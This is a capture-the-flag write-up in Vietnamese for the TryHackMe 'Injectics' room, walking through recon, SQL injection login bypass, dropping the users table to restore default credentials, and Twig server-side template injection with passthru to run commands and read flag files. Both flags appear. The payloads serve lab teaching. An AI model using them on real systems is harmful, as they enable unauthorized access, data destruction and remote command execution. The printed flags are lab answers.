# TryHackMe-Injectics

sudo nano /etc/hosts

10.201.73.222   injectics.thm

recon 

└─$ rustscan -a 10.201.73.222 -- -sV -sC

<img width="1338" height="386" alt="image" src="https://github.com/user-attachments/assets/6af74694-db0b-420e-a152-f205d9bd4220" />

trang web

<img width="1329" height="819" alt="image" src="https://github.com/user-attachments/assets/180f4581-7cf4-4024-aafa-adae4de8d7cd" />

xem nguồn trang thì tôi phát hiện file ẩn là mail.log đây là gợi ý 

<img width="873" height="838" alt="image" src="https://github.com/user-attachments/assets/e46a4cef-e815-4f48-b1ca-cb03553af449" />

<img width="1327" height="568" alt="image" src="https://github.com/user-attachments/assets/bce808c1-9e42-40ad-b667-b2de24a13b0d" />

nhưng không đăng nhập được 🥲

tôi tìm cách khác thử qua lổ hổng SQLi từ trang này 

<img width="1335" height="842" alt="image" src="https://github.com/user-attachments/assets/efc36739-dcd3-48ae-a25d-b78d8bc1101c" />

đây sẽ là payload tôi chuẩn bị 

https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt?source=post_page-----7de449371457---------------------------------------

sử dụng burp suite để thử payload trên username

<img width="1342" height="848" alt="image" src="https://github.com/user-attachments/assets/d6d12502-115f-4379-bd2d-855f90295d31" />

và tôi đã nhận được payload thành công : ' OR 'x'='x'#;

<img width="1298" height="764" alt="image" src="https://github.com/user-attachments/assets/d0a7e1a5-fac0-46aa-b663-449c25fdd81b" />

http://injectics.thm/dashboard.php

sau đó tôi đã thử các payload SLQi điều thú vị là nếu sai thì nó ra lỗi

'OR 1 = 1 --

<img width="1337" height="711" alt="image" src="https://github.com/user-attachments/assets/0bd5e998-9c9d-4ead-a81f-af755c24ede4" />


<img width="1340" height="814" alt="image" src="https://github.com/user-attachments/assets/5e15db6e-3c06-4ea8-b05e-4f44b2082dc4" />

còn nếu đúng thì nó trả về bảng dashboard

'OR 1 = 1 --

Sau đó tôi nhớ ra mail.log tôi tìm thấy trong mã nguồn là nếu có vấn đề gì với cơ sở dữ liệu thì toàn bộ tài khoản của users sẽ trả về mặc định

đã đến lúc xóa bảng user

1; DROP table users;

sau đó đợi khoảng 1-2p tôi đăng nhập với tài khoản có trong mail superadmin@injectics.thm:superSecurePasswd101

<img width="1327" height="830" alt="image" src="https://github.com/user-attachments/assets/1f78ff62-91ce-4cd0-a573-976b8d13e7d1" />

đây là cờ admin : THM{INJECTICS_ADMIN_PANEL_007}

Ở đây, tôi đã thử một payload để xác định lỗ hổng có tên là Server-Side Template Injection (SSTI) có thể tham khảo ở đây :

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com&source=post_page-----7de449371457---------------------------------------

đầu tiên tôi thử với payload 

{{5*3}}

<img width="487" height="471" alt="image" src="https://github.com/user-attachments/assets/f69b8d97-ea82-4b25-905b-4aeaffcddacf" />

kết quả thành công và đến lúc đưa lệnh vào 

<img width="1298" height="838" alt="image" src="https://github.com/user-attachments/assets/3bb72481-7085-4436-8a6a-9f6f3dbc72d0" />


{{['id',""]|sort('passthru')}}

<img width="327" height="208" alt="image" src="https://github.com/user-attachments/assets/e63707dd-9f22-46aa-9105-d91f7ae38d5f" />

oke đã có kết quả tìm thấy người dùng tôi sẽ bắt đầu tìm file ẩn ở đây 

đã thấy được file ẩn là flags.txt

<img width="1315" height="628" alt="image" src="https://github.com/user-attachments/assets/06d9d502-bb51-44ed-b483-3c1b8daf1b21" />

{{['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}

<img width="1213" height="800" alt="image" src="https://github.com/user-attachments/assets/1499eab8-e113-4b1c-8d97-a738520f159b" />

lá cờ cuối cùng : THM{5735172b6c147f4dd649872f73e0fdea}
